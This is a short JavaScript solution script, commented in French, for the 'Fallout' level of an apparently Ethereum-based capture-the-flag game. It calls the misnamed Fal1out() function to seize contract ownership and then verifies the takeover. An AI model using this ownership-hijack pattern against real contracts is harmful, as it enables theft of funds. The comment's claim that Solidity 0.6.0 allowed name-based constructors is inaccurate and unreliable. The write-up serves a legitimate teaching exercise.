// Level 2: Fallout - Solution
// L'objectif est de devenir propriétaire en exploitant l'erreur de nommage du constructeur

// Étape 1: Vérifier le propriétaire actuel
(async () => {
    console.log("Propriétaire actuel:", await contract.owner());
  })();
  
  // Étape 2: Exploiter la vulnérabilité en appelant la fonction Fal1out()
  // Cette fonction était censée être un constructeur mais ne l'est pas à cause du nom incorrect
  (async () => {
    await contract.Fal1out();
    console.log("Nouveau propriétaire après exploit:", await contract.owner());
    console.log("Est-ce nous?: ", (await contract.owner()) === player);
  })();
  
  /* 
  Explication technique:
  
  La vulnérabilité vient d'une erreur typographique dans le nom de la fonction:
  - Nom du contrat: "Fallout" (avec un "l")
  - Nom de la fonction: "Fal1out" (avec un "1")
  
  En Solidity 0.6.0, un constructeur pouvait être défini par une fonction portant
  exactement le même nom que le contrat. Ici, la fonction a un nom légèrement
  différent, ce qui en fait une fonction publique standard que n'importe qui peut appeler.
  
  Quand nous appelons cette fonction, elle exécute:
    owner = msg.sender; // Définit le propriétaire comme l'appelant
  
  Une simple erreur typographique transforme donc ce qui devait être une fonction
  d'initialisation sécurisée en une vulnérabilité critique permettant à n'importe qui
  de devenir propriétaire.
  */